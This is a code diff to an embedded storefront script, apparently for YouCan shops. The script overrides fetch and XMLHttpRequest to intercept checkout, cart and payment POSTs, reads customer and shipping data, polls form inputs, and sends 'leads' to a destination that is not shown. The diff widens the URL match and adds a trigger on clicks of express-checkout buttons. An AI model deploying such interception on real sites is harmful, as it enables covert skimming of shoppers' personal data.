@@ -391,7 +391,7 @@ export default function Settings({ user, theme, setTheme, lang, setLang, accent,
   window.fetch = function (input, init) {
     var url = (typeof input === 'string' ? input : (input || {}).url) || '';
     var method = ((init || {}).method || 'GET').toUpperCase();
-    if (method === 'POST' && /order|checkout|purchase/i.test(url)) {
+    if (method === 'POST' && /order|checkout|purchase|cart|buy|payment/i.test(url)) {
       try {
         var body = JSON.parse((init || {}).body || '{}');
         var c = body.customer || body.shipping || body;
@@ -413,7 +413,7 @@ export default function Settings({ user, theme, setTheme, lang, setLang, accent,
   var _oSend = XMLHttpRequest.prototype.send;
   XMLHttpRequest.prototype.open = function (m, u) { this._m = m; this._u = u; return _oOpen.apply(this, arguments); };
   XMLHttpRequest.prototype.send = function (body) {
-    if (this._m === 'POST' && /order|checkout|purchase/i.test(this._u)) {
+    if (this._m === 'POST' && /order|checkout|purchase|cart|buy|payment/i.test(this._u)) {
       try {
         var d = JSON.parse(body || '{}');
         var c = d.customer || d.shipping || d;
@@ -429,8 +429,16 @@ export default function Settings({ user, theme, setTheme, lang, setLang, accent,
   setInterval(captureInputs, 2000);
   document.addEventListener('input',  captureInputs, true);
   document.addEventListener('change', captureInputs, true);
-  document.addEventListener('click',  function (e) { if (e.target.closest('button, [type=submit]')) setTimeout(captureInputs, 300); }, true);
   document.addEventListener('submit', function ()   { captureInputs(); setTimeout(function () { sendLead('form'); }, 600); }, true);
+
+  // ── YouCan express checkout button (most reliable trigger) ────────────────
+  document.addEventListener('click', function (e) {
+    var btn = e.target.closest('.express-checkout-button, [class*="express-checkout"], [class*="checkout-btn"], [class*="order-btn"], button[type=submit]');
+    if (btn) {
+      captureInputs();
+      setTimeout(function () { sendLead('btn'); }, 800);
+    }
+  }, true);
 
   // ── 6. MutationObserver — catches popup success messages ─────────────────
   var _obs = new MutationObserver(function (mutations) {
